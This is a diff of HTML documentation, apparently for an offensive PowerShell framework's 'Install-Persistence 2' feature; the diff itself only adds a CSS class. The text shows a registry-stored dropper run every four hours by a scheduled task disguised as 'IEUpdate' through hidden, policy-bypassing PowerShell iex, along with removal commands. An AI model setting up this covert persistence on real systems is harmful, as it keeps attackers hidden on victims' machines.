@@ -180,30 +180,30 @@
 <div class="section" id="install-persistence-2">
 <h2>Install-Persistence 2<a class="headerlink" href="#install-persistence-2" title="Permalink to this headline">¶</a></h2>
 <p>To add this persistence use the following command:</p>
-<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">Install</span><span class="o">-</span><span class="n">Persistence</span> <span class="mi">2</span>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Install</span><span class="o">-</span><span class="n">Persistence</span> <span class="mi">2</span>
 </pre></div>
 </div>
 <p>Adds one registry key to store the dropper:</p>
-<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">Wallpaper555</span> <span class="o">-</span> <span class="n">HKCU</span>\<span class="n">Software</span>\<span class="n">Microsoft</span>\<span class="n">Windows</span>\<span class="n">currentversion</span>\<span class="n">themes</span>\
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Wallpaper555</span> <span class="o">-</span> <span class="n">HKCU</span>\<span class="n">Software</span>\<span class="n">Microsoft</span>\<span class="n">Windows</span>\<span class="n">currentversion</span>\<span class="n">themes</span>\
 </pre></div>
 </div>
 <p>Calls schtasks.exe to create a new Scheduled Task called “IEUpdate” that runs every 4 hours:</p>
-<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">schtasks</span><span class="o">.</span><span class="n">exe</span> <span class="o">/</span><span class="n">create</span> <span class="o">/</span><span class="n">sc</span> <span class="n">minute</span> <span class="o">/</span><span class="n">mo</span> <span class="mi">240</span> <span class="o">/</span><span class="n">tn</span> <span class="s2">&quot;IEUpdate&quot;</span> <span class="o">/</span><span class="n">tr</span> <span class="s2">&quot;powershell -exec bypass -Noninteractive -windowstyle hidden -c iex (Get-ItemProperty -Path Registry::HKCU\Software\Microsoft\Windows\currentversion</span><span class="se">\t</span><span class="s2">hemes\).Wallpaper555&quot;</span>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">schtasks</span><span class="o">.</span><span class="n">exe</span> <span class="o">/</span><span class="n">create</span> <span class="o">/</span><span class="n">sc</span> <span class="n">minute</span> <span class="o">/</span><span class="n">mo</span> <span class="mi">240</span> <span class="o">/</span><span class="n">tn</span> <span class="s2">&quot;IEUpdate&quot;</span> <span class="o">/</span><span class="n">tr</span> <span class="s2">&quot;powershell -exec bypass -Noninteractive -windowstyle hidden -c iex (Get-ItemProperty -Path Registry::HKCU\Software\Microsoft\Windows\currentversion</span><span class="se">\t</span><span class="s2">hemes\).Wallpaper555&quot;</span>
 </pre></div>
 </div>
 </div>
 <div class="section" id="remove-persistence-2">
 <h2>Remove-Persistence 2<a class="headerlink" href="#remove-persistence-2" title="Permalink to this headline">¶</a></h2>
 <p>To remove this persistence use the following command:</p>
-<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">Remove</span><span class="o">-</span><span class="n">Persistence</span> <span class="mi">2</span>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Remove</span><span class="o">-</span><span class="n">Persistence</span> <span class="mi">2</span>
 </pre></div>
 </div>
 <p>Removes registry key with validation of removal:</p>
-<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">Wallpaper555</span> <span class="o">-</span> <span class="n">HKCU</span>\<span class="n">Software</span>\<span class="n">Microsoft</span>\<span class="n">Windows</span>\<span class="n">currentversion</span>\<span class="n">themes</span>\
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Wallpaper555</span> <span class="o">-</span> <span class="n">HKCU</span>\<span class="n">Software</span>\<span class="n">Microsoft</span>\<span class="n">Windows</span>\<span class="n">currentversion</span>\<span class="n">themes</span>\
 </pre></div>
 </div>
 <p>Runs schtasks.exe to delete the scheduled task:</p>
-<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">schtasks</span><span class="o">.</span><span class="n">exe</span> <span class="o">/</span><span class="n">delete</span> <span class="o">/</span><span class="n">tn</span> <span class="n">IEUpdate</span> <span class="o">/</span><span class="n">F</span>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">schtasks</span><span class="o">.</span><span class="n">exe</span> <span class="o">/</span><span class="n">delete</span> <span class="o">/</span><span class="n">tn</span> <span class="n">IEUpdate</span> <span class="o">/</span><span class="n">F</span>
 </pre></div>
 </div>
 </div>
